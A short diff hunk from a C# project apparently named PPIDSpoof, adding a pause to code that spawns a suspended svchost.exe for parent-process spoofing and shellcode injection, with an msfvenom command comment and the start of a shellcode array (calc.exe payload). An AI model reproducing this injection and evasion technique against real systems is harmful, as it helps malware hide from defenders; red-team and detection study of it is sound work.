@@ -50,6 +50,7 @@ namespace PPIDSpoof
             string app = @"C:\Windows\System32\svchost.exe";
             bool procinit = CreateProcess(app, null, IntPtr.Zero, IntPtr.Zero, true, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, ref pi);
             Console.WriteLine("[*] Process Created. Process ID: {0}", pi.dwProcessId);
+            Console.ReadKey();
 
             // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
             byte[] buf = new byte[276] {
